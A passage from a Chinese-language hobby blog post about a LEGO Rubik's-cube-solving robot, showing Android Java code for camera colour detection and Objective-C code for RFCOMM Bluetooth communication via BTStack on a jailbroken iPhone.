<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="nd">@Override</span>
</span><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onPreviewFrame</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">,</span> <span class="n">Camera</span> <span class="n">camera</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">if</span><span class="o">(!</span><span class="n">flag</span><span class="o">)</span><span class="k">return</span><span class="o">;</span>
</span><span class='line'>  <span class="n">flag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>  <span class="n">Parameters</span> <span class="n">parameters</span> <span class="o">=</span> <span class="n">camera</span><span class="o">.</span><span class="na">getParameters</span><span class="o">();</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">width</span> <span class="o">=</span> <span class="n">parameters</span><span class="o">.</span><span class="na">getPreviewSize</span><span class="o">().</span><span class="na">width</span><span class="o">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">height</span> <span class="o">=</span> <span class="n">parameters</span><span class="o">.</span><span class="na">getPreviewSize</span><span class="o">().</span><span class="na">height</span><span class="o">;</span>
</span><span class='line'>  <span class="kt">int</span><span class="o">[]</span> <span class="n">rgbBuf</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">height</span><span class="o">*</span><span class="n">width</span><span class="o">];</span>
</span><span class='line'>  <span class="n">decodeYUV420SP</span><span class="o">(</span><span class="n">rgbBuf</span><span class="o">,</span> <span class="n">data</span><span class="o">,</span> <span class="n">width</span><span class="o">,</span> <span class="n">height</span><span class="o">);</span>
</span><span class='line'>  <span class="n">Bitmap</span> <span class="n">bitmap</span> <span class="o">=</span> <span class="n">Bitmap</span><span class="o">.</span><span class="na">createBitmap</span><span class="o">(</span><span class="n">rgbBuf</span><span class="o">,</span> <span class="n">width</span><span class="o">,</span> <span class="n">height</span><span class="o">,</span> <span class="n">Config</span><span class="o">.</span><span class="na">RGB_565</span><span class="o">);</span>
</span><span class='line'>  <span class="n">pickupColors</span><span class="o">(</span><span class="n">bitmap</span><span class="o">);</span>
</span><span class='line'>  <span class="k">if</span><span class="o">(!</span><span class="n">debug</span> <span class="o">&amp;&amp;</span> <span class="n">faceletNum</span> <span class="o">!=</span> <span class="mi">6</span><span class="o">)</span>
</span><span class='line'>  <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">out</span><span class="o">.</span><span class="na">writeInt</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
</span><span class='line'>      <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">decodeYUV420SP</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">rgbBuf</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">yuv420sp</span><span class="o">,</span> <span class="kt">int</span> <span class="n">width</span><span class="o">,</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">height</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>  <span class="kd">final</span> <span class="kt">int</span> <span class="n">frameSize</span> <span class="o">=</span> <span class="n">width</span> <span class="o">*</span> <span class="n">height</span><span class="o">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span><span class="n">rgbBuf</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>      <span class="k">throw</span> <span class="k">new</span> <span class="nf">NullPointerException</span><span class="o">(</span><span class="s">&quot;buffer &#39;rgbBuf&#39; is null&quot;</span><span class="o">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span><span class="n">rgbBuf</span><span class="o">.</span><span class="na">length</span> <span class="o">&lt;</span> <span class="n">frameSize</span><span class="o">)</span>
</span><span class='line'>      <span class="k">throw</span> <span class="k">new</span> <span class="nf">IllegalArgumentException</span><span class="o">(</span><span class="s">&quot;buffer &#39;rgbBuf&#39; size &quot;</span>
</span><span class='line'>              <span class="o">+</span> <span class="n">rgbBuf</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="s">&quot; &lt; minimum &quot;</span> <span class="o">+</span> <span class="n">frameSize</span><span class="o">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span><span class="n">yuv420sp</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
</span><span class='line'>      <span class="k">throw</span> <span class="k">new</span> <span class="nf">NullPointerException</span><span class="o">(</span><span class="s">&quot;buffer &#39;yuv420sp&#39; is null&quot;</span><span class="o">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="o">(</span><span class="n">yuv420sp</span><span class="o">.</span><span class="na">length</span> <span class="o">&lt;</span> <span class="n">frameSize</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">/</span> <span class="mi">2</span><span class="o">)</span>
</span><span class='line'>      <span class="k">throw</span> <span class="k">new</span> <span class="nf">IllegalArgumentException</span><span class="o">(</span><span class="s">&quot;buffer &#39;yuv420sp&#39; size &quot;</span>
</span><span class='line'>              <span class="o">+</span> <span class="n">yuv420sp</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="s">&quot; &lt; minimum &quot;</span> <span class="o">+</span> <span class="n">frameSize</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">/</span> <span class="mi">2</span><span class="o">);</span>
</span><span class='line'>  <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="o">,</span> <span class="n">yp</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">height</span><span class="o">;</span> <span class="n">j</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">uvp</span> <span class="o">=</span> <span class="n">frameSize</span> <span class="o">+</span> <span class="o">(</span><span class="n">j</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">*</span> <span class="n">width</span><span class="o">,</span> <span class="n">u</span> <span class="o">=</span> <span class="mi">0</span><span class="o">,</span> <span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>      <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">width</span><span class="o">;</span> <span class="n">i</span><span class="o">++,</span> <span class="n">yp</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>          <span class="kt">int</span> <span class="n">y</span> <span class="o">=</span> <span class="o">(</span><span class="mh">0xff</span> <span class="o">&amp;</span> <span class="o">((</span><span class="kt">int</span><span class="o">)</span> <span class="n">yuv420sp</span><span class="o">[</span><span class="n">yp</span><span class="o">]))</span> <span class="o">-</span> <span class="mi">16</span><span class="o">;</span>
</span><span class='line'>          <span class="k">if</span> <span class="o">(</span><span class="n">y</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span>
</span><span class='line'>              <span class="n">y</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>          <span class="k">if</span> <span class="o">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>              <span class="n">v</span> <span class="o">=</span> <span class="o">(</span><span class="mh">0xff</span> <span class="o">&amp;</span> <span class="n">yuv420sp</span><span class="o">[</span><span class="n">uvp</span><span class="o">++])</span> <span class="o">-</span> <span class="mi">128</span><span class="o">;</span>
</span><span class='line'>              <span class="n">u</span> <span class="o">=</span> <span class="o">(</span><span class="mh">0xff</span> <span class="o">&amp;</span> <span class="n">yuv420sp</span><span class="o">[</span><span class="n">uvp</span><span class="o">++])</span> <span class="o">-</span> <span class="mi">128</span><span class="o">;</span>
</span><span class='line'>          <span class="o">}</span>
</span><span class='line'>          <span class="kt">int</span> <span class="n">y1192</span> <span class="o">=</span> <span class="mi">1192</span> <span class="o">*</span> <span class="n">y</span><span class="o">;</span>
</span><span class='line'>          <span class="kt">int</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">y1192</span> <span class="o">+</span> <span class="mi">1634</span> <span class="o">*</span> <span class="n">v</span><span class="o">);</span>
</span><span class='line'>          <span class="kt">int</span> <span class="n">g</span> <span class="o">=</span> <span class="o">(</span><span class="n">y1192</span> <span class="o">-</span> <span class="mi">833</span> <span class="o">*</span> <span class="n">v</span> <span class="o">-</span> <span class="mi">400</span> <span class="o">*</span> <span class="n">u</span><span class="o">);</span>
</span><span class='line'>          <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="o">(</span><span class="n">y1192</span> <span class="o">+</span> <span class="mi">2066</span> <span class="o">*</span> <span class="n">u</span><span class="o">);</span>
</span><span class='line'>          <span class="k">if</span> <span class="o">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span>
</span><span class='line'>              <span class="n">r</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>          <span class="k">else</span> <span class="nf">if</span> <span class="o">(</span><span class="n">r</span> <span class="o">&gt;</span> <span class="mi">262143</span><span class="o">)</span>
</span><span class='line'>              <span class="n">r</span> <span class="o">=</span> <span class="mi">262143</span><span class="o">;</span>
</span><span class='line'>          <span class="k">if</span> <span class="o">(</span><span class="n">g</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span>
</span><span class='line'>              <span class="n">g</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>          <span class="k">else</span> <span class="nf">if</span> <span class="o">(</span><span class="n">g</span> <span class="o">&gt;</span> <span class="mi">262143</span><span class="o">)</span>
</span><span class='line'>              <span class="n">g</span> <span class="o">=</span> <span class="mi">262143</span><span class="o">;</span>
</span><span class='line'>          <span class="k">if</span> <span class="o">(</span><span class="n">b</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span>
</span><span class='line'>              <span class="n">b</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>          <span class="k">else</span> <span class="nf">if</span> <span class="o">(</span><span class="n">b</span> <span class="o">&gt;</span> <span class="mi">262143</span><span class="o">)</span>
</span><span class='line'>              <span class="n">b</span> <span class="o">=</span> <span class="mi">262143</span><span class="o">;</span>
</span><span class='line'>          <span class="n">rgbBuf</span><span class="o">[</span><span class="n">yp</span><span class="o">]</span> <span class="o">=</span> <span class="mh">0xff000000</span> <span class="o">|</span> <span class="o">((</span><span class="n">r</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="o">)</span> <span class="o">&amp;</span> <span class="mh">0xff0000</span><span class="o">)</span>
</span><span class='line'>                  <span class="o">|</span> <span class="o">((</span><span class="n">g</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="o">)</span> <span class="o">&amp;</span> <span class="mh">0xff00</span><span class="o">)</span> <span class="o">|</span> <span class="o">((</span><span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">10</span><span class="o">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="o">);</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>转换到RGB就可以正常取色，取色完毕之后就需要根据颜色来计算魔方的状态了，然后转换为U、B、D、F、R、L的形式表示。我采取的算法比较简单，先确定每个面中心块的颜色，做为该面的颜色(因为魔方不管怎么转，一个面的中心块，是不会跑到其他面的)，然后拿每个块的颜色分别与六个中间块的颜色对比，计算在RGB分量上的差值，差值最小的中心块的颜色，就是当前色块的颜色，也就是说这个块还原后和这个中心块在同一个面。差值计算方式采用RGB分量的差平方之和，代码节选如下：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">solveColors</span><span class="o">()</span> <span class="o">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">centerColors</span><span class="o">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="mi">6</span><span class="o">];</span>
</span><span class='line'>  <span class="kt">char</span><span class="o">[]</span> <span class="n">facelets</span> <span class="o">=</span> <span class="o">{</span><span class="sc">&#39;U&#39;</span><span class="o">,</span><span class="sc">&#39;B&#39;</span><span class="o">,</span><span class="sc">&#39;D&#39;</span><span class="o">,</span><span class="sc">&#39;F&#39;</span><span class="o">,</span><span class="sc">&#39;R&#39;</span><span class="o">,</span><span class="sc">&#39;L&#39;</span><span class="o">};</span>
</span><span class='line'>  <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">6</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">centerColors</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">cubeColors</span><span class="o">[</span><span class="n">i</span><span class="o">*</span><span class="mi">9</span><span class="o">+</span><span class="mi">4</span><span class="o">];</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">color</span> <span class="o">=</span> <span class="n">centerColors</span><span class="o">[</span><span class="n">i</span><span class="o">];</span>
</span><span class='line'>      <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;color&quot;</span><span class="o">,</span><span class="s">&quot;center color: &quot;</span> <span class="o">+</span> <span class="n">facelets</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+</span> <span class="s">&quot; &quot;</span> <span class="o">+</span> <span class="n">Color</span><span class="o">.</span><span class="na">red</span><span class="o">(</span><span class="n">color</span><span class="o">)+</span><span class="s">&quot;/&quot;</span><span class="o">+</span><span class="n">Color</span><span class="o">.</span><span class="na">green</span><span class="o">(</span><span class="n">color</span><span class="o">)+</span><span class="s">&quot;/&quot;</span><span class="o">+</span><span class="n">Color</span><span class="o">.</span><span class="na">blue</span><span class="o">(</span><span class="n">color</span><span class="o">));</span>           
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">54</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">min</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">MAX_VALUE</span><span class="o">;</span>
</span><span class='line'>      <span class="kt">int</span> <span class="n">cubeR</span> <span class="o">=</span> <span class="n">Color</span><span class="o">.</span><span class="na">red</span><span class="o">(</span><span class="n">cubeColors</span><span class="o">[</span><span class="n">i</span><span class="o">]),</span>
</span><span class='line'>          <span class="n">cubeG</span> <span class="o">=</span> <span class="n">Color</span><span class="o">.</span><span class="na">green</span><span class="o">(</span><span class="n">cubeColors</span><span class="o">[</span><span class="n">i</span><span class="o">]),</span>
</span><span class='line'>          <span class="n">cubeB</span> <span class="o">=</span> <span class="n">Color</span><span class="o">.</span><span class="na">blue</span><span class="o">(</span><span class="n">cubeColors</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
</span><span class='line'>      <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;color&quot;</span><span class="o">,</span><span class="s">&quot;cube color: &quot;</span> <span class="o">+</span> <span class="n">cubeR</span><span class="o">+</span><span class="s">&quot;/&quot;</span><span class="o">+</span><span class="n">cubeG</span><span class="o">+</span><span class="s">&quot;/&quot;</span><span class="o">+</span><span class="n">cubeB</span><span class="o">);</span>           
</span><span class='line'>      <span class="k">for</span><span class="o">(</span><span class="kt">int</span> <span class="n">j</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">j</span><span class="o">&lt;</span><span class="mi">6</span><span class="o">;</span> <span class="n">j</span><span class="o">++)</span> <span class="o">{</span>
</span><span class='line'>          <span class="kt">int</span> <span class="n">centerR</span> <span class="o">=</span> <span class="n">Color</span><span class="o">.</span><span class="na">red</span><span class="o">(</span><span class="n">centerColors</span><span class="o">[</span><span class="n">j</span><span class="o">]),</span>
</span><span class='line'>              <span class="n">centerG</span> <span class="o">=</span> <span class="n">Color</span><span class="o">.</span><span class="na">green</span><span class="o">(</span><span class="n">centerColors</span><span class="o">[</span><span class="n">j</span><span class="o">]),</span>
</span><span class='line'>              <span class="n">centerB</span> <span class="o">=</span> <span class="n">Color</span><span class="o">.</span><span class="na">blue</span><span class="o">(</span><span class="n">centerColors</span><span class="o">[</span><span class="n">j</span><span class="o">]);</span>
</span><span class='line'>          <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="o">(</span><span class="n">cubeR</span> <span class="o">-</span> <span class="n">centerR</span><span class="o">)</span> <span class="o">*</span> <span class="o">(</span><span class="n">cubeR</span> <span class="o">-</span> <span class="n">centerR</span><span class="o">)</span>
</span><span class='line'>                  <span class="o">+</span> <span class="o">(</span><span class="n">cubeG</span> <span class="o">-</span> <span class="n">centerG</span><span class="o">)</span> <span class="o">*</span> <span class="o">(</span><span class="n">cubeG</span> <span class="o">-</span> <span class="n">centerG</span><span class="o">)</span>
</span><span class='line'>                  <span class="o">+</span> <span class="o">(</span><span class="n">cubeB</span> <span class="o">-</span> <span class="n">centerB</span><span class="o">)</span> <span class="o">*</span> <span class="o">(</span><span class="n">cubeB</span> <span class="o">-</span> <span class="n">centerB</span><span class="o">);</span>
</span><span class='line'>          <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;color&quot;</span><span class="o">,</span><span class="s">&quot;s for &quot;</span> <span class="o">+</span> <span class="n">facelets</span><span class="o">[</span><span class="n">j</span><span class="o">]</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span> <span class="o">+</span> <span class="n">s</span><span class="o">);</span>
</span><span class='line'>          <span class="k">if</span><span class="o">(</span><span class="n">s</span> <span class="o">&lt;</span> <span class="n">min</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>              <span class="n">min</span> <span class="o">=</span> <span class="n">s</span><span class="o">;</span>
</span><span class='line'>              <span class="n">cubefaces</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">facelets</span><span class="o">[</span><span class="n">j</span><span class="o">];</span>
</span><span class='line'>          <span class="o">}</span>
</span><span class='line'>      <span class="o">}</span>
</span><span class='line'>      <span class="n">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">&quot;color&quot;</span><span class="o">,</span><span class="s">&quot;face: &quot;</span><span class="o">+</span><span class="n">cubefaces</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">+</span> <span class="s">&quot; &quot;</span> <span class="o">+</span> <span class="n">i</span><span class="o">);</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>然而，实际测试下来发现，这样的算法经常会有计算错误的时候，光线比较暗的情况下，摄像头取到的24bit的橙色和红色，依然很接近，用肉眼都很难区分。</p>

<p>还有另外一个坑，采用twophase.jar这个lib，需要约30~60M的内存，用于构建搜索树，这在当时的Android机上(至少在我的破手机上)，是不可能的事情，只好作罢，方案不得不改成：</p>

<ol>
<li>Android连接LEGO并手动扫描魔方状态</li>
<li>电脑上起一个Servlet，用于跑还原算法，按照i5的性能，平均1~2秒即可计算出22步以内的结果。</li>
<li>Android通过HTTP调用电脑的计算接口，把魔方状态作为参数，获取还原公式</li>
<li>将还原公式发给LEGO，由LEGO还原魔方</li>
</ol>


<p><img src="http://xelz.info/assets/2017/woqu.png" alt="woqu" /></p>

<p>如此繁琐，颜色识别的准确率又不美丽，我不禁开始思考人生。。。</p>

<p><img src="http://xelz.info/assets/2017/thinking.png" alt="thinking" /></p>

<p>期间考虑过换用iOS设备，但是iOS设备的蓝牙不支持RFCOMM通讯协议，也就作罢。</p>

<p>结果是，机器人被供了起来，5年里，跟着我搬了4次家。。。</p>

<h2>0x04 在iOS上重构控制器</h2>

<p>后来慢慢接触到了iOS越狱开发，也知道了BTStack这个开源库，可以通过直接操作底层接口，让越狱的iOS设备实现RFCOMM等官方蓝牙SDK不支持的协议。看了一眼躺在书橱里吃灰的LEGO机器人，想着是时候拿出来晒晒太阳了 ^.^</p>

<h3>蓝牙部分</h3>

<p>先clone了BTStack的<a href="https://github.com/bluekitchen/btstack">源码</a>，编译的时候遇到很多错误，iOS部分的工程结构本身就有很多问题，还有很多符号找不到。后来chekcout了v0.9分支，发现master的工程结构跟v0.9的完全不一样，但是两个分支里iOS的文件夹别无二致，缺少的符号在v0.9分支里都有，可能是长时间没有维护iOS版本的库了把，最终使用v0.9分支成功编译。其实也可以直接在Cidya里安装BTStack，然后将libBTStack.dylib从手机里拷出来。</p>

<p>接下来要实现RFCOMM通讯功能，坑爹的是，BTStack给出的demo中使用的是L2CAP协议，同时，BTstackManager类中只有对底层协议的封装，没有对RFCOMM/L2CAP等高层数据传输协议进行封装，留了接口，但是方法体是空的，只好自己动手了：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="nf">handlePacketWithType:</span><span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="nv">packet_type</span> <span class="nf">forChannel:</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">)</span><span class="nv">channel</span> <span class="nf">andData:</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="nv">packet</span> <span class="nf">withLen:</span><span class="p">(</span><span class="kt">uint16_t</span><span class="p">)</span> <span class="n">size</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">switch</span> <span class="p">(</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// -- omitted --</span>
</span><span class='line'>        <span class="k">case</span> <span class="n">kActivated</span>:
</span><span class='line'>            <span class="k">switch</span> <span class="p">(</span><span class="n">packet_type</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="k">case</span> <span class="n">HCI_EVENT_PACKET</span>:
</span><span class='line'>                    <span class="k">switch</span> <span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="mi">0</span><span class="p">]){</span>
</span><span class='line'>                        <span class="k">case</span> <span class="n">BTSTACK_EVENT_STATE</span>:
</span><span class='line'>                            <span class="p">[</span><span class="n">self</span> <span class="n">activationHandleEvent</span><span class="o">:</span><span class="n">packet</span> <span class="n">withLen</span><span class="o">:</span><span class="n">size</span><span class="p">];</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                        <span class="k">case</span> <span class="n">RFCOMM_EVENT_OPEN_CHANNEL_COMPLETE</span>:
</span><span class='line'>                            <span class="k">if</span> <span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>                                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;RFCOMM channel open failed, status %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>                                <span class="c1">// TODO connection failed callback</span>
</span><span class='line'>                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>                                <span class="kt">uint16_t</span> <span class="n">rfcomm_channel_id</span> <span class="o">=</span> <span class="n">READ_BT_16</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
</span><span class='line'>                                <span class="kt">uint16_t</span> <span class="n">mtu</span> <span class="o">=</span> <span class="n">READ_BT_16</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="mi">14</span><span class="p">);</span>
</span><span class='line'>                                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;RFCOMM channel open succeeded. New RFCOMM Channel ID %u, max frame size %u</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">rfcomm_channel_id</span><span class="p">,</span> <span class="n">mtu</span><span class="p">);</span>
</span><span class='line'>                                <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="n">rfcommDelegate</span> <span class="n">rfcommConnectionCreatedAtAddress</span><span class="o">:</span><span class="s">&quot;&quot;</span> <span class="n">forChannel</span><span class="o">:</span><span class="n">channel</span> <span class="n">asID</span><span class="o">:</span><span class="n">rfcomm_channel_id</span><span class="p">];</span>
</span><span class='line'>                            <span class="p">}</span>
</span><span class='line'>                            <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>                        <span class="k">case</span> <span class="n">HCI_EVENT_DISCONNECTION_COMPLETE</span>:
</span><span class='line'>                            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Basebank connection closed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>                            <span class="kt">uint16_t</span> <span class="n">rfcomm_channel_id</span> <span class="o">=</span> <span class="n">READ_BT_16</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>
